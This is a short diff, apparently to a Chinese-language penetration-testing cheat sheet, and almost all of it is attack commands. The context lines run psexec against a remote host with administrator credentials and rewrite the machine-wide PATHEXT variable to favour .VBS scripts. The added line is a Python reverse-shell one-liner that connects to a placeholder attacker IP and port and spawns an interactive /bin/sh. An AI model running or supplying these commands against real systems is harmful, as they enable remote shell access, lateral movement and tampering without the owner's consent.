@@ -98,3 +98,5 @@ psexec.exe \\192.168.10.99 -u AdminUser -p 密碼 -s cmd.exe /c C:\Windows\Temp\
 $ext = [Environment]::GetEnvironmentVariable('PATHEXT','Machine').Split(';')
 $newList = @('.VBS') + ($ext | Where-Object { $_ -ne '.VBS' })
 [Environment]::SetEnvironmentVariable('PATHEXT', ($newList -join ';'), 'Machine')
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[攻擊機IP]",[攻擊機Port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
